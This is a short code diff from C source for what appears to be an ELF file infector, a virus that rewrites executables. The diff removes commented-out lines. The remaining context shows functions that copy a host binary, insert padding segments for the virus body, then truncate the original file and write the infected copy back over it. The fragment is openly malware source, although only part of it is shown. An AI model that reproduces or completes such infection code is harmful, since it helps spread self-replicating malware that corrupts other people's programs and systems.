@@ -28,14 +28,11 @@ void	add_injection(void **dst, t_elf *elf)
 
 void	create_infection(void *dst, t_elf *elf, t_elf *virus_elf, int nb_zero)
 {
-//	void		*start;
 	void		*src;
 	void		*end;
 
 	src = elf->addr;
 	end = src + elf->size;
-//	memcpy(dst, elf->addr, elf->size);
-//	memcpy(dst + elf->size, SIGNATURE, strlen(SIGNATURE));
 	src = add_padding_segments(elf, virus_elf, src, &dst, nb_zero);
 	int pt_load_size_left = ((unsigned long)elf->addr + elf->pt_load->p_offset + elf->pt_load->p_filesz) - (unsigned long)src;
 	memcpy(dst, src, pt_load_size_left);
@@ -110,7 +107,6 @@ void	try_open_file(t_elf *virus_elf, char *file)
 						return ;
 					}
 					create_infection(new, &elf, virus_elf, nb_zero_to_add);
-					//
 					munmap(elf.addr, elf.size);
 					close(fd);
 					fd = open(file, O_TRUNC | O_WRONLY);
